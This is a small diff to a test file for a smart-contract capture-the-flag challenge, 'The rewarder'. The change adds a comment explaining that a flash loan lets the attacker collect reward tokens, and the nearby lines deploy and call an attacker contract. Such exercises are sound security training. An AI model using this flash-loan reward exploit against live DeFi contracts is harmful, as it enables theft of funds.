@@ -65,7 +65,7 @@ describe('[Challenge] The rewarder', function() {
 		/** YOUR EXPLOIT GOES HERE */
 		// Advance time 5 days so that depositors can get rewards
 		await time.increase(time.duration.days(5));
-		//Deploy attacker contract.
+		//Deploy attacker contract. due to the setup of the rewardPool. Attacker are able to use Flashloan to get reward tokens.
 		const helper = await TheRewarderPoolAttacker.new({ from: attacker });
 		// Set parameters to attack RewarderPool.
 		helper.attack(this.rewarderPool.address, this.flashLoanPool.address, TOKENS_IN_LENDER_POOL, { from: attacker });
